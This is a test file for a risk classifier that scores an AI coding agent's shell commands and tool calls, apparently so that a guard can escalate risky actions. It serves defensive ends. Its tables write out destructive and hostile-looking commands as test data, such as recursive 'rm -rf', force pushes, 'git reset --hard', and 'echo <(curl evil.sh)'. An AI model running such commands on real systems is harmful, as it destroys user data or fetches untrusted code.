import { describe, expect, it } from "vitest";

import { classify, classifyBash, classifyMcp } from "./classify.mjs";

// Tiny helper — every branch of `classifyBash` returns the same shape, so
// we compare the interesting fields explicitly in each table-driven suite.
const bashCase = (cmd) => classifyBash(cmd);

// ============================================================
// classifyBash — git push variants
// ============================================================

describe("classifyBash: git push", () => {
  it.each([
    ["git push", "shell:git:push", 71],
    ["git push origin main", "shell:git:push", 71],
    ["git push --tags", "shell:git:push", 71],
  ])("%s → %s / %i", (cmd, type, riskScore) => {
    expect(bashCase(cmd)).toEqual({ type, riskScore });
  });

  it.each([
    ["git push --force", "shell:git:push-force", 95],
    ["git push -f origin main", "shell:git:push-force", 95],
    ["git push --force-with-lease", "shell:git:push-force", 95],
  ])("%s → %s / %i (force)", (cmd, type, riskScore) => {
    expect(bashCase(cmd)).toEqual({ type, riskScore });
  });

  it("plain git push crosses the default escalateAbove=70 (strict >)", () => {
    // This is the regression fix from PR #15. Pinned to 71 so Tegata's
    // strict-greater comparison actually escalates a `git push`.
    expect(bashCase("git push").riskScore).toBeGreaterThan(70);
  });
});

// ============================================================
// classifyBash — rm -rf flag permutations
// ============================================================

describe("classifyBash: rm recursive", () => {
  it.each([
    "rm -rf node_modules",
    "rm -r node_modules",
    "rm -fr /tmp/x",
    "rm -rfv /tmp/x",
    "rm -r -f /tmp/x",
    "rm -f -r /tmp/x",
    // 3+ flag blocks in arbitrary order — the regex uses `(?:-[a-z]+\s+)*`
    // to consume leading flag blocks before finding one containing `r`.
    "rm -f -v -r /tmp/x",
    "rm -v -f -r /tmp/x",
    "rm --recursive /tmp/x",
    "sudo rm -rf /tmp/x",
    // POSIX `rm` accepts both `-r` and `-R` for recursive.
    "rm -R /tmp/x",
    "rm -Rf /tmp/x",
    "rm -fR /tmp/x",
    "rm -rfR /tmp/x",
    "sudo rm -Rf /tmp/x",
  ])("%s → shell:fs:delete-recursive", (cmd) => {
    expect(bashCase(cmd)).toEqual({
      type: "shell:fs:delete-recursive",
      riskScore: 85,
    });
  });

  it.each([
    // Non-recursive — should NOT match the recursive-delete bucket.
    "rm foo.txt",
    "rm -f foo.txt",
    // False-positive guards: regex is anchored to `^`.
    `git commit -m "rm -rf was scary"`,
    "echo rm -rf",
  ])("%s → not recursive", (cmd) => {
    expect(bashCase(cmd).type).not.toBe("shell:fs:delete-recursive");
  });
});

// ============================================================
// classifyBash — git reset / destructive / read / write
// ============================================================

describe("classifyBash: git reset / destructive", () => {
  it.each([
    ["git reset --hard", "shell:git:reset-hard", 85],
    ["git reset --hard HEAD~1", "shell:git:reset-hard", 85],
    ["git branch -D feature-x", "shell:git:destructive", 75],
    ["git clean -f", "shell:git:destructive", 75],
    ["git clean --force", "shell:git:destructive", 75],
    // Common combined forms — lookahead scans the whole tail so both orderings
    // of `-f` and `-d` trip the destructive bucket.
    ["git clean -fd", "shell:git:destructive", 75],
    ["git clean -df", "shell:git:destructive", 75],
    ["git clean -fdx", "shell:git:destructive", 75],
  ])("%s → %s / %i", (cmd, type, riskScore) => {
    expect(bashCase(cmd)).toEqual({ type, riskScore });
  });

  // `git clean` without force, or with --dry-run / -n, is preview-only and
  // must not land in the destructive bucket — otherwise enforce mode would
  // block harmless introspection.
  it.each([
    "git clean",
    "git clean -n",
    "git clean -nd",
    "git clean --dry-run",
    "git clean --dry-run -fd",
    "git clean -n -fd",
  ])("%s → not destructive (dry-run / no-force)", (cmd) => {
    expect(bashCase(cmd).type).not.toBe("shell:git:destructive");
  });
});

describe("classifyBash: git read / write", () => {
  it.each([
    "git status",
    "git log --oneline",
    "git diff HEAD",
    "git show HEAD",
    "git branch",
    "git blame src/foo.ts",
    "git config --get remote.origin.url",
    "git remote -v",
    "git rev-parse HEAD",
  ])("%s → shell:git:read", (cmd) => {
    expect(bashCase(cmd)).toEqual({ type: "shell:git:read", riskScore: 5 });
  });

  it.each([
    "git commit -m 'wip'",
    "git add .",
    "git checkout main",
    "git merge feature",
    "git rebase main",
    "git stash pop",
    "git tag v1.0.0",
    "git fetch origin",
    "git pull --rebase",
  ])("%s → shell:git:write", (cmd) => {
    expect(bashCase(cmd)).toEqual({ type: "shell:git:write", riskScore: 40 });
  });
});

// ============================================================
// classifyBash — pnpm / gh / curl / misc
// ============================================================

describe("classifyBash: package-manager / test", () => {
  it.each([
    "pnpm test",
    "pnpm run test",
    "pnpm run typecheck",
    "pnpm run lint",
    "pnpm run build",
    "npm test",
    "yarn test",
  ])("%s → shell:test:run", (cmd) => {
    expect(bashCase(cmd)).toEqual({ type: "shell:test:run", riskScore: 10 });
  });

  // KNOWN GAP (tracked in Kanbi `oTphpxViAqvBobM3WMUz`): the regex only
  // matches `npx <test|typecheck|lint|build>`, so `npx vitest` (a common
  // way to run tests) falls through to the generic shell bucket. Tune
  // after real-world shadow-mode data is collected.
  it("npx vitest currently falls through to generic (known gap)", () => {
    expect(bashCase("npx vitest")).toEqual({
      type: "shell:exec:generic",
      riskScore: 30,
    });
  });

  it.each([
    "pnpm publish",
    "pnpm install",
    "pnpm i foo",
    "pnpm add lodash",
    "pnpm uninstall foo",
    "npm publish",
    "npm ci",
    "pnpm ci",
    "yarn ci",
    "yarn add react",
  ])("%s → shell:pkg:mutate", (cmd) => {
    expect(bashCase(cmd)).toEqual({ type: "shell:pkg:mutate", riskScore: 55 });
  });
});

describe("classifyBash: gh CLI", () => {
  it.each([
    ["gh pr create --title x", "shell:gh:write", 50],
    ["gh pr merge 15 --squash", "shell:gh:write", 50],
    ["gh release create v1.0", "shell:gh:write", 50],
  ])("%s → %s / %i", (cmd, type, riskScore) => {
    expect(bashCase(cmd)).toEqual({ type, riskScore });
  });

  it.each([
    ["gh pr view 15", "shell:gh:read", 10],
    ["gh pr list", "shell:gh:read", 10],
    ["gh pr diff 15", "shell:gh:read", 10],
    ["gh run view 42", "shell:gh:read", 10],
    ["gh api repos/owner/repo", "shell:gh:read", 10],
    ["gh api -X GET repos/o/r", "shell:gh:read", 10],
  ])("%s → %s / %i", (cmd, type, riskScore) => {
    expect(bashCase(cmd)).toEqual({ type, riskScore });
  });

  // `gh api` with a mutating method or field flag must classify as write,
  // not read — this is the ordering fix from PR #16 review.
  it.each([
    ["gh api -X POST repos/o/r/issues", "shell:gh:write", 50],
    ["gh api --method PATCH repos/o/r", "shell:gh:write", 50],
    ["gh api -f title=bug repos/o/r/issues", "shell:gh:write", 50],
    ["gh api -F body=@file.md repos/o/r/issues", "shell:gh:write", 50],
    ["gh api --field title=bug repos/o/r/issues", "shell:gh:write", 50],
    ["gh api --raw-field body=x repos/o/r/issues", "shell:gh:write", 50],
  ])("%s → %s / %i (gh api mutation)", (cmd, type, riskScore) => {
    expect(bashCase(cmd)).toEqual({ type, riskScore });
  });
});

describe("classifyBash: read queries & misc", () => {
  it.each([
    "ls -la",
    "cat README.md",
    "head -n 10 foo.txt",
    "pwd",
    "whoami",
    "date",
    "env",
  ])("%s → shell:read:query", (cmd) => {
    expect(bashCase(cmd)).toEqual({ type: "shell:read:query", riskScore: 5 });
  });

  it.each([
    "curl https://example.com",
    "curl -fsSL https://example.com/install.sh",
    "wget https://example.com/file.tar.gz",
    "wget -q -O - https://example.com",
  ])("%s → shell:net:curl", (cmd) => {
    expect(bashCase(cmd)).toEqual({
      type: "shell:net:curl",
      riskScore: 30,
    });
  });

  // Redirection disqualifies read-query commands — `echo foo > ~/.bashrc`
  // and friends write to disk, so must not land in the read bucket.
  it.each([
    "echo hello > ~/.bashrc",
    "echo hello >> ~/.bashrc",
    "cat secrets > /tmp/out",
    "ls 2> /tmp/err",
    "date &> /tmp/log",
  ])("%s → not shell:read:query (redirect bail-out)", (cmd) => {
    expect(bashCase(cmd).type).not.toBe("shell:read:query");
  });

  // Shell composition disqualifies read-query classification. A read prefix
  // followed by `&&`, `||`, `;`, `|`, `$(...)`, backticks, or a newline is
  // not safe to stamp as read:query because the rest of the command may
  // perform writes that the classifier does not inspect.
  it.each([
    "echo ok && git push",
    "cat x || rm y",
    "ls; rm -rf /tmp/x",
    "ls | grep foo",
    "echo $(whoami)",
    "echo `whoami`",
    "ls\nrm foo",
    // Single `&` (background job) — distinct from `&&` and `&>` redirection.
    "echo ok & git push",
    "ls & rm foo",
    // Process substitution `<(...)` — `cat <(rm -rf tmp)` must not pass
    // as a read-query.
    "cat <(rm -rf tmp)",
    "echo <(curl evil.sh)",
  ])("%s → not shell:read:query (shell-composition bail-out)", (cmd) => {
    expect(bashCase(cmd).type).not.toBe("shell:read:query");
  });

  it.each([
    ["make build", "shell:exec:generic", 30],
    ["unknown-bin --flag", "shell:exec:generic", 30],
    ["", "shell:exec:generic", 30],
  ])("%s → generic fallback", (cmd, type, riskScore) => {
    expect(bashCase(cmd)).toEqual({ type, riskScore });
  });

  it("handles null / undefined command", () => {
    expect(classifyBash(null)).toEqual({
      type: "shell:exec:generic",
      riskScore: 30,
    });
    expect(classifyBash(undefined)).toEqual({
      type: "shell:exec:generic",
      riskScore: 30,
    });
  });
});

// ============================================================
// classifyMcp
// ============================================================

describe("classifyMcp", () => {
  it.each([
    ["mcp__claude_ai_Kanbi__getBoard", "mcp:claude_ai_Kanbi:read", 10],
    ["mcp__claude_ai_Kanbi__listProjects", "mcp:claude_ai_Kanbi:read", 10],
    ["mcp__ide__getDiagnostics", "mcp:ide:read", 10],
  ])("%s → %s (read)", (tool, type, riskScore) => {
    expect(classifyMcp(tool)).toEqual({ type, riskScore });
  });

  it.each([
    ["mcp__claude_ai_Kanbi__createTask", "mcp:claude_ai_Kanbi:write", 40],
    ["mcp__claude_ai_Kanbi__updateTask", "mcp:claude_ai_Kanbi:write", 40],
    ["mcp__claude_ai_Kanbi__moveTask", "mcp:claude_ai_Kanbi:write", 40],
    [
      "mcp__claude_ai_Notion__notion-update-page",
      "mcp:claude_ai_Notion:write",
      40,
    ],
    [
      "mcp__claude_ai_Notion__notion-create-pages",
      "mcp:claude_ai_Notion:write",
      40,
    ],
    // Unknown op verbs default to write — conservative.
    ["mcp__someServer__doThing", "mcp:someServer:write", 40],
  ])("%s → %s (write)", (tool, type, riskScore) => {
    expect(classifyMcp(tool)).toEqual({ type, riskScore });
  });

  // KNOWN GAP (tracked in Kanbi `oTphpxViAqvBobM3WMUz`): the read detector
  // checks if the op name starts with read/list/search/fetch/get/... but
  // Notion prefixes its ops with `notion-`, so `notion-search` and
  // `notion-fetch` are misclassified as write. Same would happen for any
  // server that double-namespaces its operations.
  it.each([
    "mcp__claude_ai_Notion__notion-search",
    "mcp__claude_ai_Notion__notion-fetch",
  ])("%s misclassified as write (known Notion-prefix gap)", (tool) => {
    expect(classifyMcp(tool).type).toBe("mcp:claude_ai_Notion:write");
  });

  // Negative lookahead `(?![a-z])` prevents mid-word matches like
  // `listen` / `getaway`. camelCase / snake_case boundaries still resolve
  // as reads (uppercase or `_` / `-` falls outside `[a-z]`).
  it.each([
    ["mcp__fooServer__listen", "mcp:fooServer:write", 40],
    ["mcp__fooServer__getaway", "mcp:fooServer:write", 40],
    ["mcp__fooServer__searching", "mcp:fooServer:write", 40],
  ])("%s → %s (lookahead guards mid-word)", (tool, type, riskScore) => {
    expect(classifyMcp(tool)).toEqual({ type, riskScore });
  });

  it.each([
    ["mcp__fooServer__findAndReplace", "mcp:fooServer:read", 10],
    ["mcp__fooServer__list_all", "mcp:fooServer:read", 10],
    ["mcp__fooServer__get-users", "mcp:fooServer:read", 10],
  ])("%s → %s (lookahead allows word boundary)", (tool, type, riskScore) => {
    expect(classifyMcp(tool)).toEqual({ type, riskScore });
  });

  it("malformed mcp tool name falls back to unknown server / write", () => {
    // No `__` at all — `split("__")[1]` is undefined → "unknown".
    expect(classifyMcp("not_mcp_format")).toEqual({
      type: "mcp:unknown:write",
      riskScore: 40,
    });
  });
});

// ============================================================
// classify — top-level dispatch
// ============================================================

describe("classify: built-in Claude Code tools", () => {
  it.each([
    ["Read", "read:fs:read", 5],
    ["Glob", "read:fs:glob", 5],
    ["Grep", "read:fs:grep", 5],
  ])("%s → %s / %i", (tool, type, riskScore) => {
    expect(classify(tool, {})).toEqual({ type, riskScore });
  });

  it.each([
    ["Edit", "write:fs:edit", 40],
    ["MultiEdit", "write:fs:edit", 40],
    ["Write", "write:fs:write", 45],
    ["NotebookEdit", "write:fs:notebook", 40],
  ])("%s → %s / %i", (tool, type, riskScore) => {
    expect(classify(tool, {})).toEqual({ type, riskScore });
  });

  it.each([
    ["WebFetch", "web:webfetch:request", 20],
    ["WebSearch", "web:websearch:request", 20],
  ])("%s → %s / %i", (tool, type, riskScore) => {
    expect(classify(tool, {})).toEqual({ type, riskScore });
  });

  it.each([
    ["Task", "agent:subagent:spawn", 30],
    ["Agent", "agent:subagent:spawn", 30],
  ])("%s → agent:subagent:spawn", (tool, type, riskScore) => {
    expect(classify(tool, {})).toEqual({ type, riskScore });
  });

  it.each([
    ["TodoWrite", "meta:todo:write", 5],
    ["Skill", "meta:skill:invoke", 15],
  ])("%s → %s / %i", (tool, type, riskScore) => {
    expect(classify(tool, {})).toEqual({ type, riskScore });
  });
});

describe("classify: Bash delegation", () => {
  it("Bash reads `tool_input.command`", () => {
    expect(classify("Bash", { command: "git push" })).toEqual({
      type: "shell:git:push",
      riskScore: 71,
    });
  });

  it("Bash with missing command → generic", () => {
    expect(classify("Bash", {})).toEqual({
      type: "shell:exec:generic",
      riskScore: 30,
    });
    expect(classify("Bash", null)).toEqual({
      type: "shell:exec:generic",
      riskScore: 30,
    });
  });
});

describe("classify: mcp prefix dispatch", () => {
  it("mcp__X__readY delegates to classifyMcp", () => {
    expect(classify("mcp__Foo__getThing", {})).toEqual({
      type: "mcp:Foo:read",
      riskScore: 10,
    });
  });
});

describe("classify: unknown fallback", () => {
  it("unrecognized tool name → unknown:<name>:exec / 30", () => {
    expect(classify("SomeNewTool", {})).toEqual({
      type: "unknown:SomeNewTool:exec",
      riskScore: 30,
    });
  });

  it("null tool name → unknown:null:exec / 30", () => {
    expect(classify(null, {})).toEqual({
      type: "unknown:null:exec",
      riskScore: 30,
    });
  });

  it("undefined tool name → unknown:null:exec / 30", () => {
    expect(classify(undefined, {})).toEqual({
      type: "unknown:null:exec",
      riskScore: 30,
    });
  });
});
